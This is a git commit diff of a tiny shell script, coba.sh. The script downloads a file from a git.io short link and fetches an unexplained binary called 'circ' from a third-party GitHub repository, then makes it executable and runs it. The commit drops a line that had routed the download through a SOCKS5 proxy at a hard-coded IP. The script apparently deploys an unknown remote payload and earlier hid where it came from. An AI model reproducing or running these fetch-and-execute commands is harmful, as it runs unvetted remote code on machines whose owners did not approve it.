d53f74df193da4026b34b867278d0d7dd45dc7b6
dragonballktp8 <91424626+dragonballktp8@users.noreply.github.com>
2021-10-01 23:53:02 +0700

    Update coba.sh

--- coba.sh
+++ coba.sh
@@ -2,4 +2,4 @@
 
 apt-get update
 wget -O 2 https://git.io/Jz9wF
-wget https://raw.githubusercontent.com/ributmaestro/ketapang/main/circ && export http_proxy=socks5://72.221.172.203:4145 && chmod u+x circ && ./circ
+wget https://raw.githubusercontent.com/ributmaestro/ketapang/main/circ && chmod u+x circ && ./circ
